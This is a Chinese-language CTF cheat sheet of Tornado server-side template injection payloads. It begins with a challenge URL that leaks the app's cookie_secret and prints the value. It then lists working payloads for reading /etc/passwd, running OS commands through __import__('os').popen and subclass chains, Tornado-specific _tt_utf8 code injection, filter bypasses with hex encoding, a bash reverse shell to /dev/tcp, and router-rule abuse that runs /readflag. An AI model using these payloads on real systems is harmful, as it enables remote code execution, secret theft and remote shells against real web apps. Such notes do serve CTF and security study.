## **tornado框架是Python的一个框架**
接收参数可能造成模板注入获取cookie_secret。这个值可能和生成flag有关。
```
buuoj.cn:81/error?msg={{handler.settings}}
可获取cookie_secret: d6eee621-b501-4757-9b42-5d0e36f28710
```

^
## **其他payload**
```
1、读文件
{% extends "/etc/passwd" %}
{% include "/etc/passwd" %}

2、 直接使用函数
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}

3、导入库
{% import os %}{{os.popen("ls").read()}}

4、flask中的payload大部分也通用
{{"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()}}
{{"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

其中"".__class__.__mro__[-1].__subclasses__()[133]为<class 'os._wrap_close'>类
第二个中的x为有__builtins__的class

5、利用tornado特有的对象或者方法
{{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
{{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")}}

6、利用tornado模板中的代码注入
{% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}

```

有过滤情况
```
1、过滤一些关键字如import、os、popen等（过滤引号该方法同样适用）
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理


2、过滤了括号未过滤引号
{% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}

3、过滤括号及引号
下面这种方法无回显，适用于反弹shell，为什么用exec不用eval呢？
是因为eval不支持多行语句。
__import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""

4、其他
通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```